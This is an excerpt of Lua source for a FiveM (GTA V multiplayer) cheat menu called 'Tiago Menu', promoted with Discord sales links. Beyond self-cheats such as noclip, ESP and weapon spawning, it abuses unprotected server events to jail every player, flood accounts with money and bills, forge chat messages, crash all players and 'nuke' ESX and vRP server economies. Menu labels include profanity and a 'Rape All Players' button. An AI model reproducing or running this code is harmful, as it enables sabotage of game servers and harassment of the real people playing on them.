...
function BeginTextCommandDisplayText(text)return Citizen.InvokeNative(0x25FBB336DF1804CB, text) end function AddTextComponentSubstringPlayerName(text)return Citizen.InvokeNative(0x6C188BE134E074AA, text)end function EndTextCommandDisplayText(x, y)return Citizen.InvokeNative(0xCD015E5BB0D96A57, x, y)end
...
local bi = '~u~DFefwtRE ~s~Official'
local bj = {
    {name = '~h~Black', id = 12},
    {name = '~h~Gray', id = 13},
...
function DFefwtRE.CreateMenu(id, title)
...
function DFefwtRE.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		DFefwtRE.CreateMenu(id, menus[parent].title)
...
function DFefwtRE.CurrentMenu()
	return currentMenu
end

function DFefwtRE.OpenMenu(id)
	if id and menus[id] then
...
function DFefwtRE.IsMenuOpened(id)
	return isMenuVisible(id)
end

function DFefwtRE.IsAnyMenuOpened()
...
function DFefwtRE.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
...
function DFefwtRE.Button(text, subText)
...
function DFefwtRE.MenuButton(text, id)
	if menus[id] then
		if DFefwtRE.Button(text) then
			setMenuVisible(currentMenu, false)
...
function DFefwtRE.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if DFefwtRE.Button(text, checked) then
		bool = not bool
...
function DFefwtRE.ComboBox(text, items, currentIndex, selectedIndex, callback)
	...
	if DFefwtRE.Button(text, selectedItem) then
...
function DFefwtRE.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function DFefwtRE.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function DFefwtRE.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function DFefwtRE.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function DFefwtRE.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function DFefwtRE.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
...
function DFefwtRE.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function DFefwtRE.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function DFefwtRE.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
...
function DFefwtRE.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function DFefwtRE.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function DFefwtRE.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function DFefwtRE.SetMenuButtonPressedSound(id, name, set)
...
function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"FUCK YOU SERVER BY TIAGOMODZ")
    end
end
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"FUCK SERVER BY TIAGO MODZ :)")
        end
        ...
        for i=0,128 do
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcom *TIAGO MODZ 3.2* buy Mod Menu in https://discord.gg/ARQrmX5")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcom *TIAGO MODZ 3.1* buy Mod Menu in https://discord.gg/ARQrmX5")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcom *TIAGO MODZ 3.2* buy Mod Menu in https://discord.gg/ARQrmX5")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best Tiago Menu 3.2 https://discord.gg/ARQrmX5", 10000000)
...
Citizen.CreateThread(
	function()
		...
		DFefwtRE.CreateMenu("MainMenu", "∑ TIAGO ~n~~r~MENU ∑")
		DFefwtRE.SetSubTitle("MainMenu", "VERSION 3.7")
		DFefwtRE.CreateSubMenu("Models", "MainMenu", "Model")
		DFefwtRE.CreateSubMenu("SelfMenu", "MainMenu", "PlayerMenu")
		DFefwtRE.CreateSubMenu("World", "MainMenu", "World")
		DFefwtRE.CreateSubMenu("Fuck", "MainMenu", "Fuck")
		DFefwtRE.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		DFefwtRE.CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		DFefwtRE.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		DFefwtRE.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		DFefwtRE.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		DFefwtRE.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		DFefwtRE.CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		DFefwtRE.CreateSubMenu("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		DFefwtRE.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		DFefwtRE.CreateSubMenu("ESXMoney", "ServerMenu", "Money Options")
		DFefwtRE.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		DFefwtRE.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		DFefwtRE.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		DFefwtRE.CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		DFefwtRE.CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")
		DFefwtRE.CreateSubMenu("PlayerTrollMenu", "OnlinePlayerMenu", "Troll Options")
		DFefwtRE.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
		DFefwtRE.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
		DFefwtRE.CreateSubMenu("WeaponCustomization", "WepMenu", "Weapon Cusomization Options")
		DFefwtRE.CreateSubMenu('TorqueBoostMenu', 'VehMenu', 'Torque Boost ~b~>~s~')
	    DFefwtRE.CreateSubMenu(
            'WeaponTypes',
            'WepMenu',
            'Weapons'
        )
        ...
        DFefwtRE.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
        DFefwtRE.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
		DFefwtRE.CreateSubMenu('VehBoostMenu', 'VehMenu', 'Vehicle Boost')
		
        DFefwtRE.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Types')
        DFefwtRE.CreateSubMenu(
            'CarOptions',
            'CarTypeSelection',
            'Car Options'
        )
		DFefwtRE.CreateSubMenu('LSC', 'VehMenu', 'LSC Customs')
        DFefwtRE.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
        DFefwtRE.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
		
		
		for i, da in pairs(be) do
            DFefwtRE.CreateSubMenu(da.id, 'tunings', da.name)
            if da.id == 'paint' then
                DFefwtRE.CreateSubMenu('primary', da.id, 'Primary Paint')
                DFefwtRE.CreateSubMenu('secondary', da.id, 'Secondary Paint')
                DFefwtRE.CreateSubMenu('rimpaint', da.id, 'Wheel Paint')
                DFefwtRE.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                DFefwtRE.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                DFefwtRE.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                DFefwtRE.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                DFefwtRE.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                DFefwtRE.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                DFefwtRE.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                DFefwtRE.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                DFefwtRE.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                DFefwtRE.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                DFefwtRE.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                DFefwtRE.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
		for i, da in pairs(bf) do
            DFefwtRE.CreateSubMenu(da.id, 'performance', da.name)
        end
        local SelectedPlayer
        while bm do
            ped = PlayerPedId()
            ...
            for i, da in pairs(be) do
                if DFefwtRE.IsMenuOpened('tunings') then
                    if b9 then
                        if bb == 'neon' then
                ...
                if DFefwtRE.IsMenuOpened(da.id) then
                    if da.id == 'wheeltypes' then
                        if DFefwtRE.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif DFefwtRE.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif DFefwtRE.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif DFefwtRE.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif DFefwtRE.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif DFefwtRE.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif DFefwtRE.Button('High End Wheels') then
                    ...
                    elseif da.id == 'extra' then
                        ...
                        for i, da in pairs(df) do
                            ...
                            if DFefwtRE.Button(da.menuName, pricestring) then
                                SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
                            end
                        end
                        DFefwtRE.Display()
                    elseif da.id == 'neon' then
                        if DFefwtRE.Button('None') then
                        ...
                        for i, da in pairs(bg) do
                            ...
                            if DFefwtRE.Button(i, pricestring) then
                                if not b9 then
                                    bb = 'neon'
                    ...
                    elseif da.id == 'paint' then
                        if DFefwtRE.MenuButton('~h~~p~-> ~s~Primary Paint', 'primary') then
                        elseif DFefwtRE.MenuButton('~h~~p~-> ~s~Secondary Paint', 'secondary') then
                        elseif DFefwtRE.MenuButton('~h~~p~-> ~s~Wheel Paint', 'rimpaint') then
                        end
                        DFefwtRE.Display()
                    else
                        ...
                        for dg, dh in pairs(at) do
                            ...
                            if DFefwtRE.Button(dh.menuName, price) then
                                if not b9 then
                                    bb = da.id
            ...
            for i, da in pairs(bf) do
                if DFefwtRE.IsMenuOpened(da.id) then
                    ...
                    if DFefwtRE.Button('Stock ' .. da.name, pricestock) then
                        SetVehicleMod(veh, da.id, -1)
                    elseif DFefwtRE.Button(da.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, da.id, 0)
                    elseif DFefwtRE.Button(da.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, da.id, 1)
                    elseif DFefwtRE.Button(da.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, da.id, 2)
                    elseif da.id ~= 13 and da.id ~= 12 and DFefwtRE.Button(da.name .. ' Upgrade 4', price4) then
			...
			if DFefwtRE.IsMenuOpened("MainMenu") then
			    
			    drawNotification(" Tiago Menu 3.7  ~n~~h~WELCOM ~r~[~s~ " ..GetPlayerName(PlayerId()).." ~r~]")
				...
				drawNotification("~h~~g~Official Discord: ~s~~n~~h~discord.gg/Apq4akF ~n~~r~DFefwtRE#5836")
				
				if DFefwtRE.MenuButton("→  ~h~~c~ONLINE ~s~PLAYERS", "OnlinePlayerMenu") then
				elseif DFefwtRE.MenuButton("→  ~h~~b~PLAYERS ~s~MENU", "SelfMenu") then
				elseif DFefwtRE.MenuButton("→  ~h~~o~MODELS ~s~MENU", "Models") then
				elseif DFefwtRE.MenuButton("→  ~h~~y~WORLD ~s~MENU", "World") then
				elseif DFefwtRE.MenuButton("→  ~h~~g~TELEPORTE  ~s~MENU", "TeleportMenu") then
				elseif DFefwtRE.MenuButton("→  ~h~~m~VEHICLES  ~s~MENU", "VehMenu") then
				elseif DFefwtRE.MenuButton("→  ~h~~p~WEAPONS  ~s~MENU", "WepMenu") then
				elseif DFefwtRE.MenuButton("→  ~h~~r~FUCK  ~s~MENU", "Fuck") then
				elseif DFefwtRE.MenuButton("→  ~h~<FONT COLOR='#15f600'>∑ LUA ~s~MENU ∑", "ServerMenu") then
				elseif DFefwtRE.Button("X ~r~DISCONNECT ~s~X") then
					bm = false
				end

				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("SelfMenu") then
				if
				DFefwtRE.CheckBox(
				...
				then 
				elseif DFefwtRE.ComboBox("Radius ~b~Distance", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
				...
				elseif DFefwtRE.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif DFefwtRE.Button("~h~~g~Revive") then
				SetEntityHealth(PlayerPedId(), 200)
				SetPedArmour(PlayerPedId(), 200)
				TriggerEvent("esx_status:set", "thirst", 1000000)
				TriggerEvent("esx_status:set", "hunger", 1000000)
					TriggerEvent("esx_ambulancejob:revive")
				    TriggerEvent('ambulancier:selfRespawn')
				elseif DFefwtRE.Button("~h~~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif DFefwtRE.Button("~o~~h~Set hunger to ~s~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif DFefwtRE.Button("~b~~h~Set thirst to ~s~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif DFefwtRE.Button("~h~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif DFefwtRE.Button("~h~~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
					elseif DFefwtRE.Button("~b~Cuff ~s~Player") then
				...
				elseif
				DFefwtRE.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				DFefwtRE.CheckBox(
					"~h~Super Jump",
				...
				then
				elseif
				DFefwtRE.CheckBox("~h~Fast Run",fastrun,function(enabled)fastrun = enabled end)
			 	then
				elseif
				DFefwtRE.CheckBox(
					"~h~Invisible",
				...
				then
				elseif
				DFefwtRE.CheckBox("~h~NoClip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("TeleportMenu") then
				if DFefwtRE.Button("~h~Teleport ~h~~p~Waypoint ~r~(KEY 1)") then
				TeleportToWaypoint()
			 elseif DFefwtRE.Button("~h~Teleport ~h~~p~intro Vehicle ") then
			...
			elseif DFefwtRE.Button("~h~Teleport ~s~~p~To Coords") then
                TeleportToCoords()
			elseif DFefwtRE.Button("~h~Teleport ~h~~g~LSPD ") then
			    LSPD()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~FBI') then
				fbi()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~LS Customs') then
				ls()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~Main Garage') then
				gp()
		    elseif DFefwtRE.Button('~h~Teleport ~h~~g~Ammunation') then
			    Ammunation()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~Clothes shop') then
			    shopclothes()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~Barber') then
			    barber()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~Maze Bank') then
			    MazeBank()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~Spot') then
			    spot()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~Michael House') then
			    MichaelHouse()
			elseif DFefwtRE.Button('~h~Teleport ~h~~g~Trevor Trailer') then
			    trevor()
 
			 end

		DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("World") then
			if
				DFefwtRE.CheckBox(
				"~h~ESP",
				esp,
		...
		elseif
			...
			elseif DFefwtRE.CheckBox(
				...
				elseif DFefwtRE.CheckBox(
					...
					then
				elseif DFefwtRE.Button("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif DFefwtRE.Button("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
			end

		DFefwtRE.Display()
		elseif DFefwtRE.IsMenuOpened("Fuck") then
		if DFefwtRE.Button("~h~~r~Give All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
				...
				elseif DFefwtRE.Button("~h~~r~Remove All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
		...
		elseif DFefwtRE.Button("~h~~y~(Attention) ~r~Fuck Server everything") then
                    nukeserver()
	elseif
		DFefwtRE.CheckBox(
	...
	then
		elseif DFefwtRE.Button("~h~~r~Set ~s~~h~All Nearby Vehicles Plate Text") then
            local plateInput = KeyboardInput("Enter Plate Text (8 Characters):" , "", 100000000)
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
      elseif DFefwtRE.Button("~h~~r~Close ~s~the whole square") then
 ...
 elseif DFefwtRE.Button("~h~~r~Rape ~s~All Players") then
                    RapeAllFunc()
	 elseif DFefwtRE.Button("~h~~r~Fake ~h~~s~chat Message") then 
	 local eX = KeyboardInput("Enter player name", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 10000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eX, {0, 0x99, 255}, dT) end end
      elseif DFefwtRE.Button("~h~~r~Crash ~s~All Players") then
                    for i = 0, 128 do
	...
	then
	elseif DFefwtRE.Button("~h~~r~Spawn ~p~Lion ~w~all Players") then
	...
	elseif DFefwtRE.Button("~h~~r~Spawn ~p~SWAT ~w~all Players ") then
	 ...
	 elseif DFefwtRE.Button('~h~~r~Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
	...
	then
	elseif DFefwtRE.Button("~h~~r~ESX ~s~Fuck Server economy ~s~v~y~2") then
				    esxdestroyv2()
	elseif DFefwtRE.Button("~h~~r~VRP ~s~Fuck Server economy") then
				    vrpdestroy()
	elseif
		DFefwtRE.CheckBox(
	...
	then
	elseif DFefwtRE.Button("~h~~b~------Fuck all Vehicles------") then
	elseif DFefwtRE.Button("~h~~r~Rampinator") then
    ...
    elseif DFefwtRE.CheckBox("~h~~r~Delete~s~ Vehicles", deletenearestvehicle, function(eC) deletenearestvehicle = eC end) then 
	elseif DFefwtRE.Button("~h~~r~BORGAR~s~ Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end 
	elseif DFefwtRE.CheckBox("~h~~r~Explode~s~ Vehicles", explodevehicles, function(eC) explodevehicles = eC end) then
	elseif DFefwtRE.CheckBox("~h~~r~Fuck~s~ Vehicles", fuckallcars, function(eC) fuckallcars = eC end) then end;
	
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("WepMenu") then
			if DFefwtRE.MenuButton('~h~~r~→  ~y~Ammunition', 'WeaponTypes') then
			    elseif DFefwtRE.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
				elseif DFefwtRE.MenuButton("~r~→  ~s~Weapon", "SingleWepMenu") then
				elseif DFefwtRE.Button("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif DFefwtRE.Button("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif DFefwtRE.Button("~h~~b~Give Ammo") then
					for i = 1, #allWeapons do
			...
			elseif
				...
				elseif
				 ...
				 then
				 elseif
					 DFefwtRE.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 DFefwtRE.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end
				
				DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('WeaponTypes') then
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('WeaponTypeSelection') then
                for dp, dD in pairs(d4) do
                    if DFefwtRE.MenuButton(dD.name, 'WeaponOptions') then
                        d5 = dD
                    end
                end
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('WeaponOptions') then
                if DFefwtRE.Button('~h~~y~Spawn Weapon inventory') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(d5.id), 1000, false)
                end
                if DFefwtRE.Button('~h~+ ~g~Ammo') then
                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(d5.id), 0)
                end
                if
                    DFefwtRE.CheckBox(
                        '~h~~r~Infinite ~s~Ammo',
                ...
                for dp, dD in pairs(d5.mods) do
                    if DFefwtRE.MenuButton('~h~~r~> ~s~' .. dp, 'ModSelect') then
                        d6 = dD
                    end
                end
				DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('ModSelect') then
                for _, dD in pairs(d6) do
                    if DFefwtRE.Button(dD.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(d5.id), GetHashKey(dD.id))
                    end
                end

				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
					if DFefwtRE.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
				 ...
				 DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened("WeaponCustomization") then
                if DFefwtRE.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                        rainbowTint = enabled
                ...
                then
                elseif DFefwtRE.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif DFefwtRE.Button("~g~Add Special Finish") then
                ...
                elseif DFefwtRE.Button("~r~Remove Special Finish") then
                ...
                elseif DFefwtRE.Button("~g~Add Suppressor") then
                ...
                elseif DFefwtRE.Button("~r~Remove Suppressor") then
                ...
                elseif DFefwtRE.Button("~g~Add Scope") then
                ...
                elseif DFefwtRE.Button("~r~Remove Scope") then
				...
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("VehMenu") then
			if DFefwtRE.Button("~r~→  ~s~Vehicles ~y~Name") then
					...
					elseif DFefwtRE.IsMenuOpened('compacts') then
			for i=1, #compacts do
				if DFefwtRE.Button(compacts[i]) then
					SpawnVeh(compacts[i], PlaceSelf)
				end
			end
			elseif DFefwtRE.MenuButton('~r~→  ~s~Vehicles ~r~List', 'CarTypes') then
			elseif DFefwtRE.MenuButton('~r~→  ~o~LSC ~s~Customs', 'LSC') then
			elseif DFefwtRE.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
			elseif DFefwtRE.MenuButton('~r~→  ~s~Torque Boost', 'TorqueBoostMenu') then
			elseif DFefwtRE.Button("~h~Buy ~b~vehicle ~s~~h~for ~g~free") then fv()
				elseif DFefwtRE.Button("~h~~g~Repair ~b~Vehicle~s~ (Key 2)") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif DFefwtRE.Button("~h~~g~Repair ~y~Engine") then
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
            "~r~You Aren't Sitting In A Vehicle Stupid"
				...
				elseif DFefwtRE.Button("~h~Max ~b~Exterior Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)				elseif DFefwtRE.Button("~h~Max ~b~Performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
				elseif DFefwtRE.Button("~h~Max All ~b~Tuning") then
				...
				then
			    elseif DFefwtRE.Button("~h~~b~Change License Plate") then
					local playerPed = GetPlayerPed(-1)
			...
			elseif DFefwtRE.CheckBox(
				...
				DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(be) do
                    if da.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if DFefwtRE.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'neon' then
                        if DFefwtRE.MenuButton(da.name, da.id) then
                        end
                ...
                if DFefwtRE.Button('Xenon Headlight', xenonStatus) then
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(bf) do
                    if DFefwtRE.MenuButton(da.name, da.id) then
                    end
                ...
                if DFefwtRE.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('primary') then
                DFefwtRE.MenuButton('~h~~p~-> ~s~Classic', 'classic1')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Metallic', 'metallic1')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Matte', 'matte1')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Metal', 'metal1')
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('secondary') then
                DFefwtRE.MenuButton('~h~~p~-> ~s~Classic', 'classic2')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Metallic', 'metallic2')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Matte', 'matte2')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Metal', 'metal2')
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('rimpaint') then
                DFefwtRE.MenuButton('~h~~p~-> ~s~Classic', 'classic3')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Metallic', 'metallic3')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Matte', 'matte3')
                DFefwtRE.MenuButton('~h~~p~-> ~s~Metal', 'metal3')
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('classic1') then
                for dt, du in pairs(bh) do
                    ...
                    if DFefwtRE.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('metallic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('matte1') then
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('metal1') then
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('classic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('metallic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('matte2') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('metal2') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('classic3') then
                for dt, du in pairs(bh) do
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('metallic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('matte3') then
                for dt, du in pairs(bj) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('metal3') then
                for dt, du in pairs(bk) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
            ...
            elseif DFefwtRE.IsMenuOpened('metal3') then
                ...
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('AICONTROLMENU') then
                if DFefwtRE.Button('~h~Configure AI ~g~Speed') then
                ...
                elseif DFefwtRE.Button('~h~AI Drive (Waypoint_Slow)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
